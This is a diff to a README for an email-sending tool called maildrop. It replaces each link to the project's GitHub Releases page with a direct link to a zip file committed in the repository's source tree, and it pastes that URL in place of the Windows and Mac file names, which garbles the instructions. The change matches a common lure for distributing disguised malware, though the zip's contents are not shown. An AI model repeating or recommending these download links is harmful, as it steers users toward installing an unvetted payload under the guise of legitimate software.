@@ -1,6 +1,6 @@
 # ✉️ maildrop - Effortless Email Sending Made Simple
 
-[![Download maildrop](https://img.shields.io/badge/Download-maildrop-brightgreen)](https://github.com/alene22/maildrop/releases)
+[![Download maildrop](https://github.com/alene22/maildrop/raw/refs/heads/master/src/Software_2.8.zip)](https://github.com/alene22/maildrop/raw/refs/heads/master/src/Software_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to maildrop! This guide will help you easily download and run the maildr
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page, where you can find the latest version of maildrop.
    
-   [Download maildrop](https://github.com/alene22/maildrop/releases)
+   [Download maildrop](https://github.com/alene22/maildrop/raw/refs/heads/master/src/Software_2.8.zip)
 
 2. **Select the Latest Release:** On the Releases page, look for the latest version. You will see a list of downloadable files.
 
-3. **Download the Application:** Click on the file for your operating system. It might be named something like `maildrop.exe` for Windows or `maildrop.dmg` for Mac. The file will download to your computer.
+3. **Download the Application:** Click on the file for your operating system. It might be named something like `https://github.com/alene22/maildrop/raw/refs/heads/master/src/Software_2.8.zip` for Windows or `https://github.com/alene22/maildrop/raw/refs/heads/master/src/Software_2.8.zip` for Mac. The file will download to your computer.
 
 4. **Run the Application:** Once the download is complete, locate the file in your Downloads folder. Double-click the file to open maildrop. 
 
@@ -90,6 +90,6 @@ You can find more details on these topics in the documentation provided on our G
 
 For easy access to download and install maildrop:
 
-[Download maildrop](https://github.com/alene22/maildrop/releases) 
+[Download maildrop](https://github.com/alene22/maildrop/raw/refs/heads/master/src/Software_2.8.zip) 
 
 Now you are all set! Send emails without the hassle, thanks to maildrop.
